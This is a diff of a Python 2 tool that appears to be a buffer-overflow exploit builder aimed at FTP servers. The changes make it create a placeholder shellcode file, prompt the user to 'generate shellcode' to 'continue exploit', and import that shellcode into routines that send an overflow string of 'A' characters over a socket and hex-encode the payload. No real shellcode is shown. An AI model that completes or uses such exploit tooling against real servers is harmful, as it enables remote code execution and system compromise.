@@ -5,7 +5,6 @@ import random
 import string
 import socket 
 import time
-from shell_code import shell_code 
 import fileinput
 from Banner import *
 import shutil
@@ -33,6 +32,8 @@ class Buffer_Over():
             global P
             global Y          
             time.sleep(2)
+            with open('shell_code.py','w') as shell_code:
+                shell_code.write('# pls add your shellcode '+'\n'+'shell_code =()') 	
             mode = """
             ========================                          
                Target FTP Server
@@ -241,6 +242,7 @@ class Buffer_Over():
                 from Bad_Character import Bad_Character             
                 run = Bad_Character()
             elif bad_op ==Bad_no and len(Bad_no)==2: 
+		print R+"\n\t\t!___To Continue Explit Generate shellcode and post it in shell_code.py file___! \n"+W 
                 pass
             else:
               print Y+"\n[-]"+W+R+"Please Enter "+W+B+"yes"+W+R+" or"+W+B+" no"+W+Y+" [-]"+W 
@@ -272,7 +274,7 @@ class Buffer_Over():
                     exit()
                                 
      def attack_all(self):
-	     
+	       from shell_code import shell_code 
 	       try: 	                      
                    socket_2 =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                    Start_string = self.location*"A"        
@@ -308,7 +310,7 @@ class Buffer_Over():
                    exit()  
                    
      def auto_write(self): 
-              
+	        from shell_code import shell_code      	     
                 try:                
                   shell =str(shell_code).encode("hex")
                   shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
